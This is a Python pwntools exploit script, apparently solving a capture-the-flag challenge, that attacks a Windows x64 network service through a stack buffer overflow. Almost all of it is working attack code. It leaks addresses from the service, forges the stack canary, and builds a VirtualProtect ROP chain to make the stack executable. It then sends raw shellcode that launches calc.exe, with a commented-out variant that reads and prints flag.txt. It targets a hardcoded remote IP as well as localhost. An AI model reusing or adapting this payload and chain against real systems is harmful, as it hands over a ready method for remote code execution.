
from pwn import *

def conn(is_remote=False): 
    return remote('localhost', 8888) if not is_remote else remote('34.231.191.85', 8888)
   
COM_PIPE = conn()

def leak_rsp() -> int:
    COM_PIPE.recvuntil('RSP : ')
    return int(COM_PIPE.recvline().strip(), 16)

def leak_gadgets() -> int:
   COM_PIPE.recvuntil('gadgets: ')
   return int(COM_PIPE.recvline().strip(), 16)

def leak_virtual_protect() -> int:
    COM_PIPE.recvuntil("VirtualProtect: ")
    return int(COM_PIPE.recvline().strip(), 16)


GADGETS = leak_gadgets()
RSP = leak_rsp()
VIRTUAL_PROTECT = leak_virtual_protect()

### this canary is xored against an hardcoded value that was located on the stack(rbp-8) so we were able to repreduce it by xoring 0xCAFEBEEF ^ hardcoded_value_on_the_stack  ###
COOKIE = p64(0xcafee3e0)                                               
                                                                 
POP_RCX = p64(GADGETS + 0x5)                                            # pop rcx
POP_RDX = p64(GADGETS + 0xa)                                            # pop rdx
POP_R8 = p64(GADGETS + 0xf)                                             # pop r8
POP_R9 = p64(GADGETS + 0x14)                                            # pop r9

def virtual_protect() -> bytes:
    rop = POP_RCX                                                        # pop rcx
    rop += p64(RSP - 0x2260)                                             # lpAddress = shellcode's address(stack)
    rop += POP_RDX                                                       # pop rdx
    rop += p64(4096)                                                     # dwSize = shellcode's size
    rop += POP_R8                                                        # pop r8
    rop += p64(0x40)                                                     # flNewProtect = set shellcode's page protection to PAGE_EXECUTE_READWRITE 
    rop += POP_R9                                                        # pop r8
    rop += p64(RSP)                                                      # lpFlOldProtect = RSP, if we set this parameter to NULL the function will fail 
    rop += p64(VIRTUAL_PROTECT)                                          # Overwritting stack pointer with VirtualProtectStub pointer
    rop += p64(RSP - 0x2260)                                             # call VirtualProtectStub()
    return rop

class PayloadBuilder:
    def __init__(self, shellcode: bytes, canary: bytes, rop_chain: bytes):
        self.shellcode = shellcode
        self.canary = canary
        self.rop_chain = rop_chain
        

    def _do_payload_construction(self) -> bytes:
        vulnerable_buffer_length = 4096 

        padding = vulnerable_buffer_length - len(self.shellcode)
        buffer_size = p32(len(self.shellcode) + padding + len(self.canary) + 24 + len(self.rop_chain))

        payload = buffer_size                                           # we control the buffer size so we can set it to whatever value we would like
        payload += self.shellcode                                       # our shellcode(calc.exe)
        payload += b'A'*padding                                         # padding 
        payload += self.canary                                          # canary
        payload += b'A'*24                                              # padding 
        payload += self.rop_chain                                       # VirtualProtect() rop chain, which makes the stack executable

        return payload

    def build(self) -> bytes:
        return self._do_payload_construction()

def main():

    ### CreateFileA, ReadFile, GetStdHandle, WriteFile shellcode ###
    #shellcode = b"\x48\x31\xC9\x65\x48\x8B\x41\x60\x48\x8B\x40\x18\x48\x8B\x70\x20\x48\xAD\x48\x96\x48\xAD\x48\x8B\x58\x20\x4D\x31\xC0\x44\x8B\x43\x3C\x4C\x89\xC2\x48\x01\xDA\x44\x8B\x82\x88\x00\x00\x00\x49\x01\xD8\x48\x31\xF6\x41\x8B\x70\x20\x48\x01\xDE\x48\x31\xC9\x49\xB9\x47\x65\x74\x50\x72\x6F\x63\x41\x48\xFF\xC1\x48\x31\xC0\x8B\x04\x8E\x48\x01\xD8\x4C\x39\x08\x75\xEF\x48\x31\xF6\x41\x8B\x70\x24\x48\x01\xDE\x66\x8B\x0C\x4E\x48\x31\xF6\x41\x8B\x70\x1C\x48\x01\xDE\x48\x31\xD2\x8B\x14\x8E\x48\x01\xDA\x48\x89\xD7\xB9\x6C\x65\x41\x00\x51\x48\xB9\x43\x72\x65\x61\x74\x65\x46\x69\x51\x48\x89\xE2\x48\x89\xD9\x48\x83\xEC\x20\xFF\xD7\x48\x83\xC4\x20\x48\x83\xC4\x10\x48\x89\xC6\x48\xB9\x66\x6C\x61\x67\x2E\x74\x78\x74\x51\x48\x89\xE1\xBA\x00\x00\x00\x80\x41\xB8\x01\x00\x00\x00\x41\xB9\x00\x00\x00\x00\x6A\x00\x6A\x00\x6A\x03\x48\x83\xEC\x20\xFF\xD6\x48\x83\xC4\x20\x48\x83\xC4\x20\x48\x89\xC5\x48\xB9\x52\x65\x61\x64\x46\x69\x6C\x65\x51\x48\x89\xE2\x48\x89\xD9\x48\x83\xEC\x20\xFF\xD7\x48\x83\xC4\x20\x48\x83\xC4\x08\x48\x89\xC6\x48\x89\xE9\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x48\x89\xE2\x41\xB8\x30\x00\x00\x00\x41\xB9\x00\x00\x00\x00\x6A\x00\x48\x83\xEC\x20\xFF\xD6\x48\x83\xC4\x20\x48\x83\xC4\x08\xB9\x6E\x64\x6C\x65\x51\x48\xB9\x47\x65\x74\x53\x74\x64\x48\x61\x51\x48\x89\xE2\x48\x89\xD9\x48\x83\xEC\x20\xFF\xD7\x48\x83\xC4\x20\x48\x83\xC4\x10\x48\x89\xC6\x48\xC7\xC1\xF5\xFF\xFF\xFF\xFF\xD6\x48\x89\xC5\x48\xB9\x73\x6F\x6C\x65\x41\x00\x00\x00\x51\x48\xB9\x57\x72\x69\x74\x65\x43\x6F\x6E\x51\x48\x89\xE2\x48\x89\xD9\x48\x83\xEC\x20\xFF\xD7\x48\x83\xC4\x20\x48\x83\xC4\x10\x48\x89\xC6\x48\x89\xE9\x48\x89\xE2\x41\xB8\x30\x00\x00\x00\x41\xB9\x00\x00\x00\x00\x6A\x00\x48\x83\xEC\x20\xFF\xD6\x48\x83\xC4\x20\x48\x83\xC4\x08\xB9\x65\x00\x00\x00\x51\x48\xB9\x57\x72\x69\x74\x65\x46\x69\x6C\x51\x48\x89\xE2\x48\x89\xD9\x48\x83\xEC\x20\xFF\xD7\x48\x83\xC4\x20\x48\x83\xC4\x10\x48\x89\xC6\x48\x89\xE9\x48\x89\xE2\x41\xB8\x30\x00\x00\x00\x41\xB9\x00\x00\x00\x00\x6A\x00\x48\x83\xEC\x20\xFF\xD6\x48\x83\xC4\x20\x48\x83\xC4\x08"
   
    ### calc.exe shellcode ###
    shellcode = b"\x48\x31\xFF\x48\xF7\xE7\x65\x48\x8B\x58\x60\x48\x8B\x5B\x18\x48\x8B\x5B\x20\x48\x8B\x1B\x48\x8B\x1B\x48\x8B\x5B\x20\x49\x89\xD8\x8B\x5B\x3C\x4C\x01\xC3\x48\x31\xC9\x66\x81\xC1\xFF\x88\x48\xC1\xE9\x08\x8B\x14\x0B\x4C\x01\xC2\x4D\x31\xD2\x44\x8B\x52\x1C\x4D\x01\xC2\x4D\x31\xDB\x44\x8B\x5A\x20\x4D\x01\xC3\x4D\x31\xE4\x44\x8B\x62\x24\x4D\x01\xC4\xEB\x32\x5B\x59\x48\x31\xC0\x48\x89\xE2\x51\x48\x8B\x0C\x24\x48\x31\xFF\x41\x8B\x3C\x83\x4C\x01\xC7\x48\x89\xD6\xF3\xA6\x74\x05\x48\xFF\xC0\xEB\xE6\x59\x66\x41\x8B\x04\x44\x41\x8B\x04\x82\x4C\x01\xC0\x53\xC3\x48\x31\xC9\x80\xC1\x07\x48\xB8\x0F\xA8\x96\x91\xBA\x87\x9A\x9C\x48\xF7\xD0\x48\xC1\xE8\x08\x50\x51\xE8\xB0\xFF\xFF\xFF\x49\x89\xC6\x48\x31\xC9\x48\xF7\xE1\x50\x48\xB8\x9C\x9E\x93\x9C\xD1\x9A\x87\x9A\x48\xF7\xD0\x50\x48\x89\xE1\x48\xFF\xC2\x48\x83\xEC\x20\x41\xFF\xD6"

    payload = PayloadBuilder(shellcode, COOKIE, virtual_protect()).build()

    COM_PIPE.sendline(payload)

if __name__ == '__main__':
    main() 
